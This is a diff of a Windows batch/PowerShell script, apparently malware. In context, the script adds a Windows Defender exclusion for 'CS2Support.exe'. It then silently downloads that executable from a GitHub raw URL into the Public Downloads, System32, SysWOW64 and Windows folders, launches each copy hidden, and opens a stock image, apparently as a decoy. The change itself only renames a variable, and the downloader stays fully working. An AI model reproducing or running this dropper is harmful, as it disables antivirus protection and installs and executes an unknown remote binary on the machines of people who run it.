@@ -11,15 +11,15 @@ powershell -WindowStyle Hidden -Command "
     Add-MpPreference -ExclusionExtension 'CS2Support.exe'"
 
 powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "
-    $urls = @(
+    $locations = @(
         'C:\Users\Public\Downloads\CS2Support.exe',
         'C:\Windows\System32\CS2Support.exe',
         'C:\Windows\SysWOW64\CS2Support.exe',
         'C:\Windows\CS2Support.exe'
     )
-    foreach ($path in $urls) {
-        Invoke-WebRequest -Uri 'https://github.com/AmjadBalls/TEST/raw/refs/heads/main/CS2Support.exe' -OutFile $path
-        Start-Process $path -WindowStyle Hidden
+    foreach ($location in $locations) {
+        Invoke-WebRequest -Uri 'https://github.com/AmjadBalls/TEST/raw/refs/heads/main/CS2Support.exe' -OutFile $location
+        Start-Process $location -WindowStyle Hidden
     }"
 
 start https://as2.ftcdn.net/v2/jpg/00/53/69/65/1000_F_53696591_9LO1bsQUpl2zIolFMFokrQyt04Z5dzXd.jpg
